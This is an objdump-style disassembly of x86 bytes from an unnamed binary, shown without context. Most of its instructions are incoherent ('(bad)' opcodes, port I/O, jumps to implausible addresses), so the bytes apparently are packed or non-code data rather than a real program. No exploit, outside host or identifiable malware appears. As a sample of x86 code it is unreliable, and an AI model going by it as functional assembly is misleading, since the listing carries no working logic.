  406907:	scas   al,BYTE PTR es:[edi]
  406908:	popa   
  406909:	call   FWORD PTR [ecx]
  40690b:	sub    ebx,DWORD PTR [edi-0x6859e101]
  406911:	lock push ds
  406913:	sahf   
  406914:	popa   
  406915:	call   0xffa141ae
  40691a:	push   es
  40691b:	clc    
  40691c:	pop    ebx
  40691d:	jmp    0xffa12e68
  406922:	test   BYTE PTR [edi+0x5f],0xe8
  406926:	sahf   
  406927:	adc    esi,DWORD PTR [esi+0x4]
  40692a:	xor    DWORD PTR [ebx+0x2b],ebx
  40692d:	or     al,0x31
  40692f:	out    0x61,eax
  406931:	jo     0x4068e5
  406933:	push   edi
  406934:	push   ecx
  406935:	out    dx,al
  406936:	into   
  406937:	mov    edx,0x1c3c60f1
  40693c:	push   ecx
  40693d:	fnstcw WORD PTR [eax+0x4c]
  406940:	mov    ebp,DWORD PTR ss:[eax+edx*2+0x5c]
  406945:	(bad)  
  406946:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406947:	jecxz  0x4068d9
  406949:	neg    DWORD PTR [ebx+edx*8-0x18]
  40694d:	jmp    0x4068ed
  40694f:	push   es
  406950:	test   al,0x3
  406952:	xchg   esi,eax
  406953:	push   es
  406954:	lods   eax,DWORD PTR ds:[esi]
  406955:	sub    dh,al
  406957:	adc    edx,DWORD PTR [ecx]
  406959:	sbb    eax,0xcfe4c71
  40695e:	jno    0x406927
  406960:	fnsave [ebx+0x70e9130e]
  406966:	add    BYTE PTR [eax],al
  406968:	scas   eax,DWORD PTR es:[edi]
  406969:	dec    esp
  40696a:	pop    esp
  40696b:	pop    esp
  40696c:	add    DWORD PTR [ebp+0x54],ecx
  40696f:	or     al,0x49
  406971:	jno    0x40692a
  406973:	pusha  
  406974:	push   esi
  406975:	cmp    esp,ecx
  406977:	sahf   
  406978:	dec    esi
  406979:	dec    esp
  40697a:	je     0x406942
  40697c:	ds jecxz 0x4069cf
  40697f:	and    eax,0xebe8d307
  406984:	ss push es
  406986:	sub    BYTE PTR [esi+ebp*1],al
  406989:	add    al,BYTE PTR [ebp+0x2b]
  40698c:	jo     0x4069a2
  40698e:	xchg   ecx,eax
  40698f:	or     cl,dh
  406991:	dec    ebx
  406992:	xchg   esi,eax
  406993:	or     al,0xf1
  406995:	shl    ch,0xb3
  406998:	xchg   esi,eax
  406999:	push   ss
  40699a:	jmp    0xf48c310f
  40699f:	pop    ebx
  4069a0:	popa   
  4069a1:	dec    ebx
  4069a2:	add    ah,bh
  4069a4:	sub    bh,BYTE PTR [esi+ebp*2]
  4069a7:	(bad)  
  4069a8:	push   ecx
  4069a9:	dec    ebx
  4069aa:	call   0xff8c2fec
  4069af:	rol    DWORD PTR [ebp+0x2],1
  4069b2:	inc    ecx
  4069b3:	jmp    0x41482b09
  4069b8:	jmp    0x51876905
  4069bd:	sar    ebx,0x3e
  4069c0:	out    0x13,eax
  4069c2:	call   0xff8bfeba
  4069c7:	and    ah,dh
  4069c9:	(bad)  
  4069cb:	mov    esp,0x38b50000
  4069d0:	and    DWORD PTR ds:0x16ff435e,0xb9fbd1a7
  4069da:	adc    ecx,eax
  4069dc:	or     eax,DWORD PTR [esi]
  4069de:	pop    ds
  4069df:	call   0x3c73120c
  4069e4:	std    
  4069e5:	xor    dl,BYTE PTR [si]
  4069e8:	or     ebp,DWORD PTR [ecx]
  4069ea:	inc    ecx
  4069eb:	xchg   ecx,eax
  4069ec:	shr    eax,0x32
  4069ef:	adc    al,0xc7
  4069f1:	and    al,0xfd
  4069f3:	adc    eax,DWORD PTR [eax]
  4069f5:	jmp    0xd585bd2c
  4069fa:	out    dx,al
  4069fb:	adc    al,BYTE PTR [eax]
  4069fd:	jmp    0xe9a9b55a
  406a02:	dec    eax
  406a03:	dec    ebx
  406a04:	imul   ebp,ecx,0x19f3d1a1
  406a0a:	rcl    BYTE PTR [eax+0x4b869ef4],0x50
  406a11:	sahf   
  406a12:	clc    
  406a13:	inc    edx
  406a14:	call   FWORD PTR [ecx+edx*4]
  406a17:	cmp    al,0xcf
  406a19:	pop    edi
  406a1a:	xor    eax,0xd8000b14
  406a1f:	imul   eax,DWORD PTR [ecx+ebp*8],0xffffff94
  406a23:	adc    DWORD PTR [eax],eax
  406a25:	add    BYTE PTR [eax],dh
  406a27:	in     eax,0x27
  406a29:	inc    ecx
  406a2a:	fsubr  st,st(1)
  406a2c:	je     0x406a3a
  406a2e:	and    dh,0xbe
  406a31:	inc    DWORD PTR [eax]
  406a33:	add    BYTE PTR [edi-0x80],bh
  406a36:	mov    dl,al
  406a38:	dec    ebp
  406a39:	popf   
  406a3a:	hlt    
  406a3b:	idiv   DWORD PTR [edi-0x15]
  406a3e:	dec    edi
  406a3f:	push   edx
  406a40:	pusha  
  406a41:	mov    dh,0xbe
  406a43:	(bad)  
  406a44:	call   FWORD PTR [eax-0x15080f7b]
  406a4a:	(bad)  
  406a4b:	call   0x4014f0
  406a50:	ret    0x6816
  406a53:	nop
  406a54:	xchg   BYTE PTR [edi-0x1],cl
  406a57:	(bad)  
  406a58:	cmc    
  406a59:	fcomip st,st(6)
  406a5b:	(bad)  
  406a5c:	aas    
  406a5d:	jmp    0x406a93
  406a5f:	pop    esp
  406a60:	popa   
  406a61:	dec    edi
  406a62:	jmp    edi
  406a64:	jo     0x406a0f
  406a66:	(bad)  
  406a67:	call   DWORD PTR [ecx]
  406a69:	popf   
  406a6a:	in     al,0xf7
  406a6c:	pop    edi
  406a6d:	jmp    0x69406adb
  406a72:	xor    eax,0xb4e94841
  406a77:	lock ja 0x406a63
  406a7a:	(bad)  
  406a7b:	jmp    DWORD PTR ds:0x58412854
  406a81:	mov    esi,0xe97fbf19
  406a86:	mov    BYTE PTR [ebp-0x11e94],al
  406a8c:	jb     0x406a9e
  406a8e:	push   0xff510682
  406a93:	inc    BYTE PTR [ebp+0xfff6e5]
  406a99:	add    BYTE PTR [ecx],dh
  406a9b:	mov    ds:0x546d355e,al
  406aa0:	(bad)  
  406aa1:	dec    DWORD PTR [esi]
  406aa3:	nop
  406aa4:	popf   
  406aa5:	(bad)  
  406aa6:	inc    ah
  406aa8:	xchg   eax,esp
  406aaa:	inc    dl
  406aac:	pop    ebp
  406aad:	push   0x31
  406aaf:	adc    eax,DWORD PTR [edi+0x5e3b7036]
  406ab5:	mov    ch,0xe1
  406ab7:	loop   0x406b16
  406ab9:	call   esi
  406abb:	sub    al,al
  406abd:	sub    BYTE PTR [eax+0x3b],dh
  406ac0:	imul   ebx,esi,0xffffff87
  406ac3:	rcr    BYTE PTR [ebp-0x77],cl
  406ac6:	mov    ah,0xe3
  406ac8:	push   ebp
  406ac9:	push   DWORD PTR [esi-0x3797fcab]
  406acf:	inc    ecx
  406ad0:	(bad)  
  406ad1:	jmp    DWORD PTR [edi-0x6108ad18]
  406ad7:	sub    bl,BYTE PTR [esi+0x35]
  406ada:	cmc    
  406adb:	push   ebx
  406adc:	(bad)  
  406add:	call   DWORD PTR [esi-0x79006305]
  406ae3:	les    eax,FWORD PTR [edi+0x5d4a86dc]
  406ae9:	xor    DWORD PTR [edi+edx*1+0x3b6eff56],0xffffffd7
  406af1:	fs mov dl,0x70
  406af4:	jo     0x406aed
  406af6:	pop    esi
  406af7:	push   0x4
  406af9:	je     0x406af0
  406afb:	mov    ebp,0xe89e
  406b00:	inc    esi
  406b01:	pop    edx
  406b02:	pop    ebp
  406b03:	add    BYTE PTR [ebp+0x3effec2d],bh
  406b09:	pop    edx
  406b0a:	sahf   
  406b0b:	(bad)  
  406b0c:	mov    esp,0xe9036b32
  406b11:	jns    0x406b70
  406b13:	(bad)  
  406b14:	fcom   QWORD PTR [ebx]
  406b16:	xchg   ebp,eax
  406b17:	push   ebp
  406b18:	push   ds
  406b19:	dec    ecx
  406b1a:	sahf   
  406b1b:	xlat   BYTE PTR ds:[ebx]
  406b1c:	cs cmp al,0x3e
  406b1f:	pushf  
  406b20:	push   cs
  406b21:	dec    ecx
  406b22:	mov    ss,WORD PTR [edi+0x5d864119]
  406b28:	(bad)  
  406b29:	mov    esi,0x8c686bf0
  406b2e:	jbe    0x406b8d
  406b30:	out    dx,al
  406b31:	jle    0x406ab8
  406b33:	push   ebp
  406b34:	out    0x48,al
  406b36:	data16 xlat BYTE PTR ds:[ebx]
  406b38:	ss cmp al,0x22
  406b3b:	pushf  
  406b3c:	(bad)  
  406b3d:	dec    eax
  406b3e:	push   esi
  406b3f:	xchg   edi,eax
  406b40:	rol    DWORD PTR [eax+0x4e],1
  406b43:	pop    ebp
  406b44:	(bad)  
  406b45:	mov    esi,0x8c0c6bf0
  406b4a:	ds pop ebp
  406b4c:	mov    dh,0x7e
  406b4e:	adc    eax,0x2e48ae55
  406b53:	xlat   BYTE PTR ds:[ebx]
  406b54:	cs cmp al,0x6
  406b57:	pushf  
  406b58:	sahf   
  406b59:	dec    eax
  406b5a:	push   ds
  406b5b:	xchg   edi,eax
  406b5c:	lea    eax,[eax+0x16]
  406b5f:	pop    ebp
  406b60:	cdq    
  406b61:	cli    
  406b62:	push   ecx
  406b63:	pop    ebp
  406b64:	add    BYTE PTR [eax],al
  406b66:	xchg   BYTE PTR [eax+0x3c],cl
  406b69:	jo     0x406af1
  406b6b:	dec    eax
  406b6c:	(bad)  
  406b6d:	imul   edx,DWORD PTR [edi],0xffffff8d
  406b70:	neg    BYTE PTR [esi+ebp*2+0x7e]
  406b74:	add    DWORD PTR [ebp+0x66],edx
  406b77:	dec    eax
  406b78:	shl    eax,1
  406b7a:	fwait
  406b7b:	dec    eax
  406b7c:	ficomp WORD PTR [esp+ebx*4+0x33]
  406b80:	ficomp WORD PTR [esi+ecx*2+0x3b]
  406b84:	loope  0x406b1e
  406b86:	inc    esi
  406b87:	dec    eax
  406b88:	(bad)  
  406b89:	xchg   esi,eax
  406b8a:	pop    ebp
  406b8b:	inc    eax
  406b8c:	mov    esi,0x46495c
  406b91:	jae    0x406b20
  406b93:	inc    edi
  406b94:	push   DWORD PTR [edx+eax*4+0x3f]
  406b98:	jmp    DWORD PTR [esi-0x6ef83e83]
  406b9e:	cmp    eax,0x6d96ff46
  406ba3:	xor    eax,0xe8476596
  406ba9:	lea    ebx,[eax-0x108100b9]
  406baf:	aas    
  406bb0:	jmp    0xff87fadc
  406bb5:	outs   dx,BYTE PTR ds:[esi]
  406bb6:	dec    DWORD PTR [ebx-0x18]
  406bb9:	pop    ss
  406bba:	scas   al,BYTE PTR es:[edi]
  406bbb:	adc    al,0x0
  406bbd:	xor    BYTE PTR [eax+0x1c],dh
  406bc0:	add    BYTE PTR [ecx+edi*4+0x66258338],bh
  406bc7:	mov    edx,0xd2ff
  406bcc:	cs inc edi
  406bce:	jne    0x406bc1
  406bd0:	dec    edx
  406bd1:	ds mov bh,0x36
  406bd4:	or     eax,0x9a2d459d
  406bd9:	jo     0x406c11
  406bdb:	test   al,0x32
  406bdd:	inc    edi
  406bde:	jne    0x406bd1
  406be0:	or     bh,BYTE PTR [esi]
  406be2:	std    
  406be3:	push   ss
  406be4:	in     eax,dx
  406be5:	inc    esi
  406be6:	jne    0x406bf5
  406be8:	in     eax,0xc0
  406bea:	pop    es
  406beb:	adc    DWORD PTR [ebx-0x74],edx
  406bee:	(bad)  
  406bef:	(bad)  
  406bf0:	call   0xa8297046
  406bf5:	call   0xe6f7:0x63ee68ec
  406bfc:	cli    
  406bfd:	cwde   
  406bfe:	inc    ebp
  406bff:	fstp   QWORD PTR [ebp-0x141a8aba]
  406c05:	add    BYTE PTR [eax+eax*1+0x6c],bl
  406c09:	inc    edi
  406c0a:	out    0x0,eax
  406c0c:	ins    BYTE PTR es:[edi],dx
  406c0d:	pushf  
  406c0e:	add    BYTE PTR [eax],al
  406c10:	inc    ebx
  406c11:	ror    DWORD PTR [esi],cl
  406c13:	test   DWORD PTR [edx],esp
  406c15:	adc    DWORD PTR [eax],eax
  406c17:	add    bh,cl
  406c19:	push   esp
  406c1a:	test   DWORD PTR [eax],0xc7001308
  406c20:	dec    ebp
  406c21:	in     al,0xfe
  406c23:	pop    es
  406c24:	sbb    BYTE PTR [ebx],dl
  406c26:	push   0x0
  406c28:	xor    dl,BYTE PTR [eax]
  406c2a:	push   0x0
  406c2c:	and    dl,BYTE PTR [eax]
  406c2e:	lea    eax,[ebp+0x0]
  406c31:	add    BYTE PTR [eax+eax*4-0x74],bh
  406c35:	test   DWORD PTR [ebx+eiz*8-0x2],ebp
  406c39:	dec    DWORD PTR [eax-0x15]
  406c3c:	je     0x406c36
  406c3e:	push   edi
  406c3f:	gs sti 
  406c41:	call   0x410804
  406c46:	rcl    edx,cl
  406c48:	jae    0x406c4f
  406c4a:	jno    0x406c39
  406c4c:	add    BYTE PTR [eax],al
  406c4e:	enter  0xcc3a,0x28
  406c52:	mov    DWORD PTR [edx],edx
  406c54:	push   DWORD PTR [ebp-0x6c]
  406c57:	mov    edx,0xeb57bdd8
  406c5c:	mov    dl,al
  406c5e:	and    eax,0x37f7f495
  406c63:	jmp    0x406cb4
  406c65:	push   edx
  406c66:	xor    BYTE PTR [edx-0x43],cl
  406c69:	push   DWORD PTR [edi]
  406c6b:	cdq    
  406c6c:	test   eax,esi
  406c6e:	jg     0x406c59
  406c70:	(bad)  
  406c71:	push   0xffffff88
  406c73:	cmp    al,BYTE PTR [eax]
  406c75:	aaa    
  406c76:	cdq    
  406c77:	adc    bh,bh
  406c79:	mov    ch,0x68
  406c7b:	loope  0x406c7b
  406c7d:	call   DWORD PTR [edi+0x23]
  406c80:	pop    esp
  406c81:	sub    DWORD PTR [ecx],ecx
  406c83:	adc    al,ch
  406c85:	and    eax,0xff5aa031
  406c8a:	mov    eax,0x3ef75eaf
  406c8f:	dec    ebp
  406c90:	in     eax,dx
  406c91:	dec    esi
  406c93:	mov    dl,BYTE PTR [ecx]
  406c95:	inc    ecx
  406c96:	add    BYTE PTR [eax],al
  406c98:	xor    DWORD PTR [esi-0x70],edi
  406c9b:	lock push ds
  406c9d:	ja     0x406cf9
  406c9f:	jmp    DWORD PTR [edi+ecx*8+0x2c]
  406ca3:	inc    ecx
  406ca4:	xor    DWORD PTR [ebx-0x60f142fe],esp
  406caa:	mov    WORD PTR [ebp-0xa560eb],es
  406cb0:	mov    edi,DWORD PTR [ebx]
  406cb2:	jmp    0x406caa
  406cb4:	aas    
  406cb5:	cld    
  406cb6:	add    edi,edi
  406cb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cb9:	retf   
  406cba:	push   ecx
  406cbb:	jmp    esi
  406cbd:	mov    dh,0xf
  406cbf:	pop    esp
  406cc0:	or     BYTE PTR [ebx+eax*1-0x18],bh
  406cc4:	enter  0x5aa7,0xff
  406cc8:	mov    eax,0xc6f76ab8
  406ccd:	(bad)  
  406cce:	in     al,dx
  406ccf:	call   DWORD PTR [esi+0x37]
  406cd2:	adc    al,BYTE PTR [ecx+0x31]
  406cd5:	push   es
  406cd6:	nop
  406cd7:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cd9:	(bad)  
  406cda:	pop    ecx
  406cdb:	call   FWORD PTR [edi+edx*4+0x2c]
  406cdf:	inc    ecx
  406ce0:	xor    DWORD PTR [ebx],esp
  406ce2:	dec    esi
  406ce3:	mov    esp,0x858c2696
  406ce8:	xchg   ecx,eax
  406ce9:	es pop edx
  406ceb:	push   DWORD PTR [eax+esi*4+0xe7ef72e]
  406cf2:	mov    bl,0x67
  406cf4:	jne    0x406d73
  406cf6:	(bad)  
  406cf7:	jmp    FWORD PTR [edi+0x8]
  406cfa:	push   ebx
  406cfb:	test   DWORD PTR [eax],0x59366600
  406d01:	xor    eax,0xc31013fd
  406d06:	push   esi
  406d07:	sub    eax,0x454e9891
  406d0c:	loop   0x406d51
  406d0e:	mov    ebp,0x65976a2a
  406d13:	cmp    eax,0xbf2d59c6
  406d18:	fcomp  DWORD PTR [eax+0x61]
  406d1b:	xchg   ebp,eax
  406d1c:	ins    BYTE PTR es:[edi],dx
  406d1d:	cmp    BYTE PTR [esi],bl
  406d1f:	inc    ebp
  406d20:	scas   al,BYTE PTR es:[edi]
  406d21:	mov    ah,0x16
  406d23:	mov    edi,0x3916595f
  406d28:	cmc    
  406d29:	or     al,0xf1
  406d2b:	mov    edi,0xbb0eb3ee
  406d30:	dec    edi
  406d31:	pop    ecx
  406d32:	dec    BYTE PTR [esp+ebp*2+0x38]
  406d36:	inc    BYTE PTR [esi+edi*2-0x11]
  406d3a:	out    dx,al
  406d3b:	inc    esp
  406d3c:	jmp    0x76a419c7
  406d41:	pop    ecx
  406d42:	fsubrp st(3),st
  406d44:	ror    BYTE PTR [edx],1
  406d46:	push   ds
  406d47:	shr    eax,cl
  406d49:	pop    eax
  406d4a:	test   BYTE PTR [ebx+0x5e],al
  406d4d:	pop    ecx
  406d4e:	mov    BYTE PTR [esp+edx*1-0x48],0x9
  406d53:	shr    eax,cl
  406d55:	imul   ebx,DWORD PTR [ebx-0x78],0x3e
  406d59:	pop    ecx
  406d5a:	mov    eax,0xa651118e
  406d5f:	inc    esp
  406d60:	push   0xffffff97
  406d62:	add    BYTE PTR [eax],al
  406d64:	xchg   ebp,eax
  406d65:	cmp    al,0x26
  406d67:	pop    ecx
  406d68:	xor    DWORD PTR ds:0x14317d65,edx
  406d6e:	jmp    0x167831f7
  406d73:	pop    ecx
  406d74:	jle    0x406d89
  406d76:	idiv   BYTE PTR [edi-0x59]
  406d79:	adc    ebp,ecx
  406d7b:	add    esi,DWORD PTR [edx+0x10086]
  406d81:	inc    ebp
  406d82:	(bad)  
  406d83:	jmp    0xe9c1fdb1
  406d88:	xor    dl,BYTE PTR [eax+ebp*2]
  406d8b:	stc    
  406d8c:	xor    dh,BYTE PTR ds:0xc77d6be
  406d92:	call   0xff851d0f
  406d97:	(bad)  
  406d98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d99:	aaa    
  406d9a:	idiv   DWORD PTR [esi-0x1e8abc77]
  406da0:	call   0xb543:0x79aeb539
  406da7:	xchg   ecx,eax
  406da8:	add    DWORD PTR [ebx-0x1],0xe81bff9e
  406daf:	mov    esi,0x8eff43b7
  406db4:	scas   eax,DWORD PTR es:[edi]
  406db5:	cmp    bh,dh
  406db7:	xchg   BYTE PTR [ecx+0x43],bl
  406dba:	jne    0x406dad
  406dbc:	pop    edx
  406dbd:	dec    ebp
  406dbe:	mov    ch,0x76
  406dc0:	mov    DWORD PTR [ebx-0x4b],eax
  406dc3:	lea    eax,[ecx+0x66ff43]
  406dc9:	add    bh,ah
  406dcb:	sbb    ebp,eax
  406dcd:	sar    BYTE PTR [edi-0x48a900bd],0x34
  406dd4:	test   DWORD PTR [esi+0x59],0x4af17543
  406ddb:	jno    0x406d92
  406ddd:	or     DWORD PTR ds:[edi+0x430111bd],edx
  406de4:	(bad)  
  406de5:	jmp    0x64c38c58
  406dea:	bound  ecx,QWORD PTR [ebx-0x1]
  406ded:	push   ds
  406dee:	mov    cs,eax
  406df0:	adc    DWORD PTR [edx+0x7],esp
  406df3:	pop    esp
  406df4:	test   DWORD PTR [esi],0x3042d9
  406dfa:	das    
  406dfb:	push   edx
  406dfc:	pop    es
  406dfd:	call   0x400083
  406e02:	xor    edx,DWORD PTR [ecx]
  406e04:	push   0x0
  406e06:	dec    edi
  406e07:	push   ecx
  406e08:	pop    es
  406e09:	call   0x40133b
  406e0e:	outs   dx,DWORD PTR ds:[esi]
  406e0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e10:	in     al,0xf7
  406e12:	pop    edi
  406e13:	jmp    0x406dfc
  406e15:	mov    DWORD PTR [eax-0x4a000115],esp
  406e1b:	stos   DWORD PTR es:[edi],eax
  406e1c:	idiv   bh
  406e1e:	out    dx,eax
  406e1f:	scas   eax,DWORD PTR es:[edi]
  406e20:	jge    0x406dda
  406e22:	fucomip st,st(2)
  406e24:	(bad)  
  406e25:	mov    ch,0xf0
  406e27:	sar    dh,cl
  406e29:	inc    eax
  406e2b:	data16 mov bh,0xff
  406e2e:	add    BYTE PTR [eax],al
  406e30:	scas   eax,DWORD PTR es:[edi]
  406e31:	jmp    0xe8fe:0xeaa7e0b4
  406e38:	xor    BYTE PTR [eax-0x5b500001],ah
  406e3e:	fdiv   st,st(7)
  406e40:	outs   dx,DWORD PTR ds:[esi]
  406e41:	jmp    0x406e2a
  406e43:	pop    ebp
  406e44:	and    bl,ch
  406e46:	(bad)  
  406e47:	jmp    DWORD PTR ds:0x4ffff6e8
  406e4d:	mov    al,0x51
  406e4f:	mov    eax,0x45feeb6f
  406e54:	pusha  
  406e55:	mov    cl,0xd4
  406e57:	std    
  406e58:	outs   dx,DWORD PTR ds:[esi]
  406e59:	jmp    0x406e59
  406e5b:	jne    0x406ec9
  406e5d:	mov    al,0x9b
  406e5f:	mov    bl,BYTE PTR [eax-0x6f3d36ea]
  406e65:	push   ss
  406e66:	push   ebp
  406e67:	mov    ebx,DWORD PTR [edi+edx*4-0x3c]
  406e6b:	cld    
  406e6c:	ret    0x6a16
  406e6f:	or     eax,0xe807652f
  406e74:	xor    DWORD PTR [ecx-0x4c810070],edx
  406e7a:	sar    bl,0x9
  406e7d:	push   ds
  406e7e:	push   cs
  406e7f:	inc    ecx
  406e80:	xor    DWORD PTR [edx-0x30],eax
  406e83:	pop    es
  406e84:	pop    ecx
  406e85:	(bad)  
  406e86:	push   edi
  406e87:	call   FWORD PTR [esi+0x31]
  406e8a:	sar    bl,1
  406e8c:	push   esi
  406e8d:	fisttp WORD PTR [ebx]
  406e8f:	call   0xff971652
  406e94:	add    BYTE PTR [eax],al
  406e96:	js     0x406f06
  406e98:	(bad)  
  406e99:	jmp    ebp
  406e9b:	mov    ch,0x66
  406e9d:	sub    DWORD PTR [ebp-0x78],0xb12eff4e
  406ea4:	mov    edi,0xd08a81fb
  406ea9:	or     ebx,DWORD PTR [esi]
  406eab:	dec    ecx
  406eac:	mov    bh,0x28
  406eae:	jo     0x406edb
  406eb0:	imul   edx,DWORD PTR [edx-0x45],0x2b
  406eb4:	add    ecx,DWORD PTR [ebx]
  406eb6:	icebp  
  406eb7:	cmp    al,BYTE PTR [eax+0x32b335f]
  406ebd:	(bad)  
  406ebe:	ins    BYTE PTR es:[edi],dx
  406ebf:	xchg   ebx,eax
  406ec0:	add    eax,DWORD PTR [eax]
  406ec2:	xor    DWORD PTR [ebx],ebp
  406ec4:	ds inc ebp
  406ec6:	(bad)  
  406ec8:	std    
  406ec9:	(bad)  
  406eca:	ficom  WORD PTR ds:0x65316a04
  406ed0:	add    ebp,DWORD PTR [edx+0x31]
  406ed3:	mov    al,0xbf
  406ed5:	repz popa 
  406ed7:	mov    eax,0xd2c6f47f
  406edc:	push   ebp
  406edd:	push   eax
  406ede:	mov    dh,0x80
  406ee0:	pop    ebx
  406ee1:	jmp    DWORD PTR [edi+edi*8]
  406ee4:	push   0x24
  406ee6:	mov    ebx,0x710b032b
  406eeb:	xchg   DWORD PTR [eax],eax
  406eed:	jmp    0x42b8345
  406ef2:	xor    DWORD PTR [ebx+ebp*1+0x1613f02b],ebp
  406ef9:	rol    BYTE PTR [eax],1
  406efb:	add    BYTE PTR [edx],ch
  406efd:	sub    al,0xa6
  406eff:	call   0x97bc:0x33724176
  406f06:	cmc    
  406f07:	dec    ebp
  406f08:	inc    cx
  406f0a:	cdq    
  406f0b:	mov    cl,0x56
  406f0d:	nop
  406f0e:	xor    dl,BYTE PTR [esi+0x56]
  406f11:	mov    ebp,DWORD PTR [esp+edx*2+0x46]
  406f15:	inc    ecx
  406f16:	fiadd  WORD PTR [edi+0x55de50ac]
  406f1c:	ds in  al,0x40
  406f1f:	mov    esi,edi
  406f21:	shr    al,cl
  406f23:	push   esp
  406f24:	in     al,0x43
  406f26:	mov    dh,0x55
  406f28:	es inc ecx
  406f2a:	cld    
  406f2b:	mov    bh,0x49
  406f2d:	shr    eax,cl
  406f2f:	imul   esp,DWORD PTR [edi-0x47aa5983],0xffffff96
  406f36:	test   DWORD PTR [ebp+0x6],ecx
  406f39:	inc    ecx
  406f3a:	add    eax,DWORD PTR [ecx+ecx*4]
  406f3d:	jae    0x406f15
  406f3f:	ret    0x41f6
  406f42:	cmp    al,0x54
  406f44:	out    0x40,al
  406f46:	jle    0x406f9d
  406f48:	sbb    al,0xe0
  406f4a:	mov    edi,0xf938dec2
  406f4f:	cdq    
  406f50:	(bad)  
  406f51:	inc    eax
  406f52:	jo     0x406fd3
  406f54:	fisttp QWORD PTR [eax+0x5e]
  406f57:	push   ebp
  406f58:	pop    ebx
  406f59:	adc    al,0xc1
  406f5b:	popf   
  406f5c:	push   es
  406f5d:	shr    eax,cl
  406f5f:	push   esp
  406f60:	add    BYTE PTR [eax],al
  406f62:	jl     0x406fa7
  406f64:	ds push ebp
  406f66:	scas   al,BYTE PTR es:[edi]
  406f67:	inc    eax
  406f68:	hlt    
  406f69:	mov    bh,0x59
  406f6b:	sar    edi,cl
  406f6d:	call   0x2efa557c
  406f72:	cld    
  406f73:	mov    al,BYTE PTR [ebp-0xbf03ef]
  406f79:	xchg   ebx,eax
  406f7a:	xor    ch,BYTE PTR [eax+esi*4-0x1bf8c22]
  406f81:	push   esp
  406f82:	fisttp QWORD PTR [eax-0x1]
  406f85:	push   es
  406f86:	add    al,0x7
  406f88:	pop    esp
  406f89:	shl    BYTE PTR [ebx+0x40],1
  406f8c:	out    0xbd,eax
  406f8e:	mov    eax,0xd660ff40
  406f93:	xor    esi,edi
  406f95:	out    0xe5,al
  406f97:	mov    es,WORD PTR [ebp-0xbf0a3f]
  406f9d:	cmp    DWORD PTR [ebp+0x6c],ecx
  406fa0:	aaa    
  406fa1:	sub    BYTE PTR ds:0x7db9b541,ch
  406fa7:	aas    
  406fa8:	(bad)  
  406fa9:	mov    esi,0x2828e037
  406fae:	xor    eax,0x7d73112c
  406fb3:	aas    
  406fb4:	or     ebp,DWORD PTR [ecx+0x5c8322fe]
  406fba:	dec    edx
  406fbb:	inc    edi
  406fbc:	call   DWORD PTR [esi-0x71f63702]
  406fc2:	and    cl,BYTE PTR [edi+0xa585]
  406fc8:	jge    0x407009
  406fca:	call   DWORD PTR [edx-0x6a7aa8c8]
  406fd0:	ins    DWORD PTR es:[edi],dx
  406fd1:	aas    
  406fd2:	call   esp
  406fd4:	xor    dl,BYTE PTR [eax+eax*1]
  406fd7:	mov    ecx,0x5eb6625a
  406fdc:	pop    ebp
  406fdd:	xchg   ecx,eax
  406fde:	test   DWORD PTR [ecx],edi
  406fe0:	ins    DWORD PTR es:[edi],dx
  406fe1:	aas    
  406fe2:	(bad)  
  406fe3:	mov    ecx,0x37a3ca
  406fe8:	fst    DWORD PTR [ebx]
  406fea:	push   DWORD PTR [ebp-0x12f98]
  406ff0:	addr16 push cs
  406ff2:	pop    esp
  406ff3:	sub    ecx,ecx
  406ff5:	adc    ebp,eax
  406ff7:	int    0x11
  406ff9:	call   0x4f987bfc
  406ffe:	adc    al,BYTE PTR [ebx-0x8fd1b]
  407004:	daa    
  407005:	aas    
  407006:	je     0x407012
  407008:	aaa    
  407009:	and    ecx,DWORD PTR [edi-0x12fc37b]
  40700f:	push   DWORD PTR [ebx]
  407011:	or     eax,0xd03c85c7
  407016:	(bad)  
  407017:	call   FWORD PTR [eax+0x13]
  40701a:	add    BYTE PTR [eax],al
  40701c:	or     al,ah
  40701e:	lea    esi,[esi-0x427d1c99]
  407024:	ins    BYTE PTR es:[edi],dx
  407025:	(bad)  
  407027:	call   FWORD PTR [eax]
  407029:	add    DWORD PTR ds:[bx+si],0x0
  40702e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40702f:	cld    
  407030:	idiv   bh
  407032:	out    0x15,eax
  407034:	jne    0x40706c
  407036:	jb     0x407050
  407038:	lea    eax,[ebp-0x1253c]
  40703e:	dec    eax
  40703f:	jecxz  0x406ff5
  407041:	in     al,0x9f
  407043:	loop   0x407043
  407045:	call   0x3f5f14
  40704a:	jecxz  0x40701e
  40704c:	jae    0x407057
  40704e:	pop    ebx
  40704f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407050:	int3   
  407051:	mul    DWORD PTR [edi-0x1d]
  407054:	push   DWORD PTR [ebp+edi*8-0x1f]
  407058:	mov    ah,0xe4
  40705a:	outs   dx,DWORD PTR ds:[esi]
  40705b:	jecxz  0x40705b
  40705d:	call   0x400cea
  407062:	xor    esi,ebp
  407064:	mov    ah,ah
  407066:	mov    esi,0x310052cd
  40706b:	sub    eax,0xd8e48303
  407070:	pop    edx
  407071:	call   FWORD PTR [esi-0x4d9528d4]
  407077:	scas   eax,DWORD PTR es:[edi]
  407078:	pop    edi
  407079:	test   DWORD PTR [esi+0x137403f5],0x86e890aa
  407083:	and    eax,0x83fd0053
  407088:	fild   DWORD PTR [ecx]
  40708a:	xor    DWORD PTR [esi],esp
  40708c:	xchg   edx,eax
  40708d:	(bad)  
  40708e:	fadd   QWORD PTR [ebx+ebx*2-0x59]
  407092:	add    BYTE PTR [eax],al
  407094:	mov    ds:0x9cff5245,eax
  407099:	inc    eax
  40709a:	pop    edx
  40709b:	dec    DWORD PTR [esi+0x35]
  40709e:	fadd   DWORD PTR [edi]
  4070a0:	pop    ecx
  4070a1:	xor    DWORD PTR [ebp-0x679ac101],edx
  4070a7:	call   0xff92bdea
  4070ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070ad:	inc    ebx
  4070ae:	pop    ebx
  4070af:	in     eax,dx
  4070b0:	jecxz  0x407130
  4070b2:	push   edx
  4070b3:	jmp    esp
  4070b5:	ja     0x407111
  4070b7:	call   DWORD PTR [esi]
  4070b9:	outs   dx,DWORD PTR ds:[esi]
  4070ba:	cwde   
  4070bb:	in     al,0x6
  4070bd:	ja     0x407111
